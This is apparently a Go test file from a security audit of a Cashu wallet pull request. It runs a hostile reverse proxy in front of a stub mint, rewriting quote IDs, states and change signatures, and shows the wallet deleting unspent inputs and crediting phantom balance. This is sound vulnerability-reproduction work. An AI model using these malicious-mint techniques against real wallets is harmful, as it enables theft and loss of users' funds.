package wallet

// Hostile-mint reproduction for the PR #46 review gaps the author
// confirmed at head 74254915 (OpenTollGate/gonuts-tollgate PR #46,
// issuecomment-6586603833):
//
//	GAP-A  the recovery GET's answer is never bound to OUR quote id
//	       before PAID is accepted and local quote state is saved
//	       (GetMeltQuoteState / resumeOneMelt / finishMeltResume).
//	GAP-B  constructMeltChangeProofs enforces signature COUNT but no
//	       total-value ceiling from the stored quote's fee reserve.
//
// These tests assert the VULNERABLE behavior: a test failing here means
// the corresponding guard exists (gap refuted), not that the harness is
// broken. Frozen predictions: PREDICTIONS-2026-11-03.md (cashu-audit
// private mirror).
//
// Harness: the PR's own honest signingMint runs unchanged behind a
// mutating reverse proxy ("buggy mint front"). Only
// GET /v1/melt/quote/bolt11/* answers (and, for V6, the melt POST
// response state) are rewritten on the wire. Everything the wallet
// sends passes through unmodified.

import (
	"bytes"
	"encoding/hex"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/http/httputil"
	"net/url"
	"strings"
	"testing"

	"github.com/OpenTollGate/gonuts-tollgate/cashu"
	"github.com/OpenTollGate/gonuts-tollgate/cashu/nuts/nut05"
	"github.com/OpenTollGate/gonuts-tollgate/crypto"
	"github.com/decred/dcrd/dcrec/secp256k1/v4"
)

const foreignQuoteID = "e771b3ac-1234-4000-8000-00000000046x" // deliberately not our quote id

// hostileProxy fronts the honest stub mint and rewrites melt-quote GET
// answers (plus optionally the melt POST response state) on the wire.
type hostileProxy struct {
	t        *testing.T
	server   *httptest.Server
	upstream *url.URL
	mint     *signingMint

	// GET /v1/melt/quote/bolt11/* knobs
	quoteIDOverride string // rewrite the "quote" field
	forceState      string // force the "state" field
	changeMode      string // "passthrough" (default) | "remove" | "empty" | "inject"
	injectSigs      []cashu.BlindedSignature

	// POST /v1/melt/bolt11 knob
	meltPOSTState string // rewrite the melt response "state" (V6)

	// evidence
	lastGETBody []byte
	meltOutputs cashu.BlindedMessages // blank outputs captured from the melt POST
	getsServed  int
	restoreSeen int
}

func newHostileProxy(t *testing.T, m *signingMint) *hostileProxy {
	t.Helper()
	up, err := url.Parse(m.server.URL)
	if err != nil {
		t.Fatalf("parse upstream: %v", err)
	}
	p := &hostileProxy{t: t, upstream: up, mint: m, changeMode: "passthrough"}
	proxy := httputil.NewSingleHostReverseProxy(up)
	p.server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/v1/melt/bolt11") {
			body, _ := io.ReadAll(r.Body)
			r.Body = io.NopCloser(bytes.NewReader(body))
			var req struct {
				Outputs cashu.BlindedMessages `json:"outputs"`
			}
			if json.Unmarshal(body, &req) == nil && len(req.Outputs) > 0 {
				p.meltOutputs = req.Outputs
			}
		}
		if r.Method == http.MethodPost && strings.HasSuffix(r.URL.Path, "/v1/restore") {
			p.restoreSeen++
		}

		isQuoteGet := r.Method == http.MethodGet && strings.Contains(r.URL.Path, "/v1/melt/quote/bolt11/")
		if isQuoteGet {
			p.getsServed++
		}
		if !isQuoteGet && p.meltPOSTState == "" {
			proxy.ServeHTTP(w, r)
			return
		}

		// Capture the upstream answer, then rewrite it on the wire.
		req, err := http.NewRequest(r.Method, p.upstream.String()+r.URL.Path, r.Body)
		if err != nil {
			t.Fatalf("build upstream request: %v", err)
		}
		req.Header = r.Header
		resp, err := http.DefaultTransport.RoundTrip(req)
		if err != nil {
			http.Error(w, err.Error(), http.StatusBadGateway)
			return
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		doc := map[string]any{}
		if err := json.Unmarshal(body, &doc); err != nil {
			w.WriteHeader(resp.StatusCode)
			_, _ = w.Write(body)
			return
		}
		if isQuoteGet {
			if p.quoteIDOverride != "" {
				doc["quote"] = p.quoteIDOverride
			}
			if p.forceState != "" {
				doc["state"] = p.forceState
			}
			switch p.changeMode {
			case "remove":
				delete(doc, "change")
			case "empty":
				doc["change"] = []cashu.BlindedSignature{}
			case "inject":
				doc["change"] = p.injectSigs
			}
			p.lastGETBody, _ = json.Marshal(doc)
			_, _ = w.Write(p.lastGETBody)
			return
		}
		// melt POST response rewrite (V6): forced state never carries change.
		doc["state"] = p.meltPOSTState
		delete(doc, "change")
		rewritten, _ := json.Marshal(doc)
		_, _ = w.Write(rewritten)
	}))
	t.Cleanup(p.server.Close)
	return p
}

// fundAndMelt mints 64 sats, takes a melt quote (amount 21, fee_reserve
// 1, one blank output) and starts Melt(). crashMode:
//
//	"after"  – the melt POST reaches the mint, the answer is dropped
//	           (the crash shape the PR recovers from);
//	"before" – the POST never leaves the wallet (network failure); the
//	           intent and pending inputs stay journaled, the mint never
//	           sees the melt.
func fundAndMelt(t *testing.T, mintURL string, crashMode string) (*Wallet, string) {
	t.Helper()
	w, err := LoadWallet(Config{WalletPath: t.TempDir(), CurrentMintURL: mintURL})
	if err != nil {
		t.Fatal(err)
	}
	q, err := w.RequestMint(64, mintURL)
	if err != nil {
		t.Fatal(err)
	}
	if _, err = w.MintTokens(q.Quote); err != nil {
		t.Fatal(err)
	}
	mq, err := w.RequestMeltQuote(fakeMeltInvoice, mintURL)
	if err != nil {
		t.Fatal(err)
	}
	original := postMeltBolt11
	postMeltBolt11 = func(mint string, request nut05.PostMeltBolt11Request) (*nut05.PostMeltQuoteBolt11Response, error) {
		if crashMode == "after" {
			if _, err := original(mint, request); err != nil {
				return nil, err
			}
		}
		return nil, errors.New("connection reset by peer")
	}
	_, meltErr := w.Melt(mq.Quote)
	postMeltBolt11 = original
	if meltErr == nil {
		t.Fatal("melt must surface the simulated failure")
	}
	if len(w.db.GetPendingSwaps()) != 1 {
		t.Fatalf("crashed melt not journaled: %d intents", len(w.db.GetPendingSwaps()))
	}
	return w, mq.Quote
}

// V1 — GAP-A: a foreign quote's PAID answer drives full recovery.
func TestHostileV1ForeignQuotePaidAccepted(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, quoteID := fundAndMelt(t, p.server.URL, "after")
	before := w.GetBalance()

	p.quoteIDOverride = foreignQuoteID
	p.changeMode = "remove" // GET omits change; NUT-09 restore returns the real 1 sat

	recovered, failed, err := w.ResumePendingOperations()

	q := w.db.GetMeltQuoteById(quoteID)
	if err != nil || failed != 0 || recovered != 1 {
		t.Fatalf("PREDICTION V1 REFUTED (resume refused the foreign answer): recovered=%d failed=%d err=%v", recovered, failed, err)
	}
	if q == nil || q.State != nut05.Paid {
		t.Fatalf("PREDICTION V1 REFUTED: our quote %s not marked PAID (q=%+v)", quoteID, q)
	}
	if w.GetBalance() != before+1 {
		t.Fatalf("PREDICTION V1 REFUTED: balance=%d want %d", w.GetBalance(), before+1)
	}
	if len(w.db.GetPendingSwaps()) != 0 || m.melts != 1 || p.restoreSeen == 0 {
		t.Fatalf("harness drift: intents=%d meltPOSTs=%d proxyRestores=%d",
			len(w.db.GetPendingSwaps()), m.melts, p.restoreSeen)
	}
	t.Logf("V1 CONFIRMED: foreign quote id %q answered the GET for %q; wallet credited 1 sat, marked OUR quote PAID, retired the intent. Wire answer: %s",
		foreignQuoteID, quoteID, p.lastGETBody)
}

// V1b — GAP-A fund-loss shape: the melt never reached the mint, a
// foreign PAID lie makes the wallet destroy its only record of live inputs.
func TestHostileV1bForeignPaidDestroysUnspentInputs(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, quoteID := fundAndMelt(t, p.server.URL, "before")

	if m.melts != 0 {
		t.Fatalf("harness drift: melt POST reached the stub (%d)", m.melts)
	}
	pendingBefore := w.PendingBalance()
	if pendingBefore != 22 {
		t.Fatalf("harness drift: pending=%d want 22 (amount 21 + fee_reserve 1)", pendingBefore)
	}

	p.quoteIDOverride = foreignQuoteID
	p.forceState = "PAID" // the stub honestly says UNPAID; the front lies
	p.changeMode = "remove"

	recovered, failed, err := w.ResumePendingOperations()

	q := w.db.GetMeltQuoteById(quoteID)
	if err != nil || failed != 0 {
		t.Fatalf("PREDICTION V1b REFUTED (resume refused): recovered=%d failed=%d err=%v", recovered, failed, err)
	}
	if q == nil || q.State != nut05.Paid {
		t.Fatalf("PREDICTION V1b REFUTED: quote not marked PAID (q=%+v)", q)
	}
	if w.PendingBalance() != 0 || len(w.db.GetPendingSwaps()) != 0 {
		t.Fatalf("PREDICTION V1b REFUTED: records survived (pending=%d intents=%d)", w.PendingBalance(), len(w.db.GetPendingSwaps()))
	}
	if m.melts != 0 {
		t.Fatalf("harness drift: stub saw %d melt POSTs", m.melts)
	}
	t.Logf("V1b CONFIRMED: invoice never paid (0 melt POSTs), yet quote %s marked PAID and %d sats of unspent inputs deleted from the wallet with err=nil. Wire answer: %s",
		quoteID, pendingBefore, p.lastGETBody)
}

// V2 — GAP-A+B combined: a foreign change signature (valid crypto over a
// point that is NOT our journaled output) is zipped with our blank and
// stored as phantom balance.
func TestHostileV2ForeignChangeSignatureStoredAsBalance(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, _ := fundAndMelt(t, p.server.URL, "after")
	before := w.GetBalance()

	// A perfectly valid 64-sat signature — over someone else's B_.
	foreignB := randPrivKey(t).PubKey()
	C_ := crypto.SignBlindedMessage(foreignB, m.privs[64])
	p.quoteIDOverride = foreignQuoteID
	p.forceState = "PAID"
	p.changeMode = "inject"
	p.injectSigs = []cashu.BlindedSignature{{
		Amount: 64,
		Id:     m.keyset.Id,
		C_:     hex.EncodeToString(C_.SerializeCompressed()),
	}}

	recovered, failed, err := w.ResumePendingOperations()

	if err != nil || failed != 0 || recovered != 64 {
		t.Fatalf("PREDICTION V2 REFUTED (foreign signature refused): recovered=%d failed=%d err=%v", recovered, failed, err)
	}
	if w.GetBalance() != before+64 {
		t.Fatalf("PREDICTION V2 REFUTED: balance=%d want %d", w.GetBalance(), before+64)
	}
	if p.restoreSeen != 0 {
		t.Fatalf("harness drift: restore hit (%d)", p.restoreSeen)
	}
	// Offline mint-side validity check: a real 64-sat proof over our
	// secret must satisfy C == k·H(secret). Compute the expected C with
	// the mint's own 64-sat key and show the stored proof does not.
	var phantom *cashu.Proof
	for i, pr := range w.db.GetProofs() {
		if pr.Amount == 64 {
			phantom = &w.db.GetProofs()[i]
		}
	}
	if phantom == nil {
		t.Fatal("harness drift: stored phantom 64-sat proof not found")
	}
	Y, err := crypto.HashToCurve([]byte(phantom.Secret))
	if err != nil {
		t.Fatal(err)
	}
	expectedC := crypto.SignBlindedMessage(Y, m.privs[64]).SerializeCompressed()
	if phantom.C == hex.EncodeToString(expectedC) {
		t.Fatalf("PREDICTION V2 WEAKENED: stored proof unexpectedly valid (C=%s)", phantom.C)
	}
	t.Logf("V2 CONFIRMED: 64-sat signature over a foreign point credited (balance %d→%d); stored C=%s but a valid proof would be %s — unspendable at any verifying mint. Wire answer: %s",
		before, w.GetBalance(), phantom.C, hex.EncodeToString(expectedC), p.lastGETBody)
}

// V3 — GAP-B: total change 64 vs stored fee_reserve 1, cryptographically
// valid, OUR quote id. No ceiling anywhere.
func TestHostileV3OverCeilingValidChangeAccepted(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, quoteID := fundAndMelt(t, p.server.URL, "after")
	before := w.GetBalance()
	stored := w.db.GetMeltQuoteById(quoteID)
	if stored.FeeReserve != 1 {
		t.Fatalf("harness drift: stored fee_reserve=%d want 1", stored.FeeReserve)
	}
	if len(p.meltOutputs) != 1 || p.meltOutputs[0].Amount != 0 {
		t.Fatalf("harness drift: captured %d blank outputs", len(p.meltOutputs))
	}

	// Sign OUR actual blank output — with the wrong (64-sat) key.
	B_bytes, err := hex.DecodeString(p.meltOutputs[0].B_)
	if err != nil {
		t.Fatal(err)
	}
	BPub, err := secp256k1.ParsePubKey(B_bytes)
	if err != nil {
		t.Fatal(err)
	}
	C_ := crypto.SignBlindedMessage(BPub, m.privs[64])
	p.forceState = "PAID" // our id this time; only the amount is hostile
	p.changeMode = "inject"
	p.injectSigs = []cashu.BlindedSignature{{
		Amount: 64,
		Id:     m.keyset.Id,
		C_:     hex.EncodeToString(C_.SerializeCompressed()),
	}}

	recovered, failed, err := w.ResumePendingOperations()

	if err != nil || failed != 0 || recovered != 64 {
		t.Fatalf("PREDICTION V3 REFUTED (over-ceiling change refused): recovered=%d failed=%d err=%v", recovered, failed, err)
	}
	if w.GetBalance() != before+64 {
		t.Fatalf("PREDICTION V3 REFUTED: balance=%d want %d", w.GetBalance(), before+64)
	}
	t.Logf("V3 CONFIRMED: change 64 accepted against stored fee_reserve=%d — no total-value bound enforced anywhere. Wire answer: %s",
		stored.FeeReserve, p.lastGETBody)
}

// V4 — residual "absence as zero change": an explicit empty change array
// bypasses the NUT-09 restore branch and silently drops real change.
func TestHostileV4EmptyChangeArraySkipsRestore(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, _ := fundAndMelt(t, p.server.URL, "after")
	before := w.GetBalance()

	if m.restoreCalls != 0 {
		t.Fatalf("harness drift: %d restores before resume", m.restoreCalls)
	}
	p.changeMode = "empty" // our id, PAID upstream — change really exists in restore memory

	recovered, failed, err := w.ResumePendingOperations()

	if err != nil || failed != 0 || recovered != 0 {
		t.Fatalf("PREDICTION V4 REFUTED (empty array not treated as zero): recovered=%d failed=%d err=%v", recovered, failed, err)
	}
	if m.restoreCalls != 0 || p.restoreSeen != 0 {
		t.Fatalf("PREDICTION V4 REFUTED: restore was consulted (%d/%d)", m.restoreCalls, p.restoreSeen)
	}
	if len(w.db.GetPendingSwaps()) != 0 {
		t.Fatal("PREDICTION V4 REFUTED: intent kept")
	}
	t.Logf("V4 CONFIRMED: mint answered PAID with \"change\":[] while holding a real 1-sat signature; wallet retired the intent without asking NUT-09. Balance stayed %d. Wire answer: %s",
		before, p.lastGETBody)
}

// V5 — honest control: harness validity, matches the PR's own test.
func TestHostileV5HonestControl(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, _ := fundAndMelt(t, p.server.URL, "after")
	before := w.GetBalance()

	recovered, failed, err := w.ResumePendingOperations()

	if err != nil || failed != 0 || recovered != 1 || w.GetBalance() != before+1 {
		t.Fatalf("V5 CONTROL FAILED (harness broken): recovered=%d failed=%d err=%v balance=%d", recovered, failed, err, w.GetBalance())
	}
	if m.melts != 1 {
		t.Fatalf("V5 CONTROL: melt POSTs=%d want 1 (no resubmission)", m.melts)
	}
	t.Logf("V5 control: honest recovery works through the proxy (balance %d→%d, %d melt POST)", before, w.GetBalance(), m.melts)
}

// V6 — the same missing binding on the pre-existing interactive path.
func TestHostileV6CheckMeltQuoteStateForeignPaid(t *testing.T) {
	m := newSigningMint(t)
	p := newHostileProxy(t, m)
	w, err := LoadWallet(Config{WalletPath: t.TempDir(), CurrentMintURL: p.server.URL})
	if err != nil {
		t.Fatal(err)
	}
	q, err := w.RequestMint(64, p.server.URL)
	if err != nil {
		t.Fatal(err)
	}
	if _, err = w.MintTokens(q.Quote); err != nil {
		t.Fatal(err)
	}
	mq, err := w.RequestMeltQuote(fakeMeltInvoice, p.server.URL)
	if err != nil {
		t.Fatal(err)
	}

	p.meltPOSTState = "PENDING" // melt settles to PENDING; inputs stay pending in the wallet
	resp, err := w.Melt(mq.Quote)
	if err != nil || resp.State != nut05.Pending {
		t.Fatalf("harness drift: melt err=%v state=%v", err, resp.State)
	}
	if w.PendingBalance() != 22 {
		t.Fatalf("harness drift: pending=%d want 22", w.PendingBalance())
	}

	p.meltPOSTState = ""
	p.quoteIDOverride = foreignQuoteID
	p.forceState = "PAID"

	stateResp, err := w.CheckMeltQuoteState(mq.Quote)
	if err != nil {
		t.Fatalf("PREDICTION V6 REFUTED (foreign PAID refused on interactive path): %v", err)
	}
	if stateResp.Quote != foreignQuoteID {
		t.Fatalf("harness drift: response quote %q", stateResp.Quote)
	}
	stored := w.db.GetMeltQuoteById(mq.Quote)
	if stored == nil || stored.SettledAt == 0 {
		t.Fatalf("PREDICTION V6 REFUTED: PAID branch did not run (stored=%+v)", stored)
	}
	if w.PendingBalance() != 0 {
		t.Fatalf("PREDICTION V6 REFUTED: pending proofs survived (%d)", w.PendingBalance())
	}
	// Correction to the frozen prediction: the foreign PAID *was* accepted
	// (SettledAt/Preimage persisted, inputs destroyed), but the interactive
	// path never writes quote.State = Paid at all — an additional
	// pre-existing defect the probe surfaced.
	if stored.State != nut05.Pending {
		t.Fatalf("harness drift: expected the observed State==PENDING anomaly, got %v", stored.State)
	}
	t.Logf("V6 CONFIRMED (corrected): CheckMeltQuoteState accepted %q's PAID for quote %s — settled the quote (SettledAt=%d, preimage set) and deleted pending inputs — while never persisting State=Paid (stays %v). Wire answer: %s",
		foreignQuoteID, mq.Quote, stored.SettledAt, stored.State, p.lastGETBody)
}
